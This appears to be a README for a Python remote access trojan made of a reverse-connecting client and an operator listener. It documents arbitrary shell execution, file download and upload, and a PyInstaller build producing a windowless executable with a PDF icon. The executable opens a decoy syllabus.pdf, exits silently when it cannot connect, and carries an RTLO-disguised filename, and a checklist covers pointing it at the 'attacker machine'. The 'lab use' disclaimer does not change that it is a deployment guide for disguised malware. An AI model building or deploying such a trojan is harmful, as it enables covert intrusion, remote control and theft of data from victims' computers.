# RAT

Remote administration tooling for lab use: a TCP-based client (`connector2.py`) and an operator-side listener (`test/listner.py`). Communication uses newline-delimited JSON over a single socket connection.

## Folder layout

| Path | Purpose |
|------|---------|
| `connector2.py` | Client — connects outbound, runs commands, handles file transfer |
| `connector2.spec` | PyInstaller spec to build `connector2` as a windowless one-file executable |
| `commands.txt` | Build commands, deployment notes, and naming reminders |
| `test/listner.py` | Listener — binds a port, accepts one client, sends commands interactively |
| `test/test.txt` | Placeholder test file |
| `test.txt` | Placeholder test file |
| `build/` | PyInstaller build output for `connector2` (generated; safe to regenerate) |

`connector.py` is legacy and not part of this documentation.

## Architecture

```
┌─────────────────┐         TCP (JSON + \n)         ┌──────────────────┐
│  connector2.py  │  ───────────────────────────►  │ test/listner.py  │
│  (client)       │  ◄───────────────────────────  │  (listener)      │
└─────────────────┘                                └──────────────────┘
```

Both sides share the same framing helpers:

- **`reliable_send`** — serializes data with `json.dumps`, appends `\n`, sends on the socket.
- **`reliable_receive`** — reads until a newline, then `json.loads` the payload.

Commands are sent as JSON arrays (e.g. `["cd", "C:\\temp"]` or `["whoami"]`).

## connector2.py

### `Connector` class

| Method | Behavior |
|--------|----------|
| `__init__(host, port)` | Opens `AF_INET` / `SOCK_STREAM` and connects to the listener |
| `execute_command(command)` | Runs a shell command via `subprocess.run` (`shell=True`); returns stdout or stderr |
| `change_working_directory(path)` | `os.chdir(path)` |
| `read_file(path)` | Reads a file and returns base64-encoded content (for `download`) |
| `write_file(path, content)` | Decodes base64 and writes a file (for `upload`) |
| `run()` | Main loop: receive command → dispatch → send result |

### Supported commands (client side)

| Command | Form | Action |
|---------|------|--------|
| `exit` | `["exit"]` | Closes socket and exits |
| `cd` | `["cd", "<path>"]` | Changes working directory |
| `download` | `["download", "<path>"]` | Returns file contents as base64 |
| `upload` | `["upload", "<path>", "<base64>"]` | Writes decoded content to `<path>` |
| *(any other)* | e.g. `["dir"]` or `["ipconfig"]` | Executed as a shell command |

Default connection target at the bottom of the file:

```python
my_connector = Connector("127.0.0.1", 4444)
```

Change `host` to the listener (attacker) machine IP before deployment.

### PyInstaller / bundled PDF

When built as a one-file executable, startup code runs before the connector:

```python
file_name = sys._MEIPASS + "\syllabus.pdf"
subprocess.Popen(file_name, shell=True)
```

`syllabus.pdf` must be bundled with `--add-data` (see **Building**). Connection failures call `sys.exit()` silently.

## test/listner.py

### `Listener` class

| Method | Behavior |
|--------|----------|
| `__init__(host, port)` | Binds, listens, accepts **one** client |
| `execute_remotely(command)` | Sends command to client; on `exit`, closes and quits |
| `run()` | REPL: `input()` → split command → handle `upload` locally → print result |

### Listener-specific handling

- **`upload`** — reads the local file, base64-encodes it, appends to the command list, then sends to the client.
- **`download`** — receives base64 from the client and writes the decoded file locally.

Default bind address:

```python
my_listener = Listener("127.0.0.1", 4444)
```

For remote clients, bind to `0.0.0.0` (or the host interface) so the connector can reach the listener.

## Building connector2 (PyInstaller)

Notes from `commands.txt` and `connector2.spec`:

```text
pyinstaller --add-data "<path-to-RAT>\syllabus.pdf;." --onefile --noconsole --icon=pdf.ico connector2.py
```

| Option | Effect |
|--------|--------|
| `--onefile` | Single executable |
| `--noconsole` | No console window (`console=False` in spec) |
| `--add-data "syllabus.pdf;."` | Bundles PDF for `sys._MEIPASS` at runtime |
| `--icon=pdf.ico` | Executable icon (see `connector2.spec`) |

Regenerate with the spec file:

```text
pyinstaller connector2.spec
```

Output lands under `build/connector2/` and `dist/connector2.exe` (names per PyInstaller defaults).

### Deployment checklist (`commands.txt`)

1. Set the **connector** IP to the listener host (attacker machine).
2. Set the **listener** bind address so remote clients can connect (e.g. `0.0.0.0`).
3. Ensure `syllabus.pdf` and `pdf.ico` exist beside the project when building.
4. Optional output naming reference: `syllabus-refl‮fdp.exe` (RTLO-style filename for lab demos).

## Protocol summary

1. Listener starts and waits on `host:port`.
2. Connector connects outbound.
3. Operator types a command; listener splits on spaces and sends a JSON array.
4. Connector executes, returns a string (or base64 for downloads).
5. Loop until `exit` or disconnect.

## Requirements

- Python 3 with standard library: `socket`, `subprocess`, `json`, `os`, `base64`, `sys`
- PyInstaller (for building the client executable)
- `syllabus.pdf` and `pdf.ico` when using the documented build path

## Local testing

1. Start the listener: `python test/listner.py`
2. Run the client: `python connector2.py` (or the built `.exe`)
3. At the `Enter a command:` prompt, try `whoami`, `cd ..`, `download <file>`, `upload <local> <remote>`, `exit`

Use only in authorized lab environments.
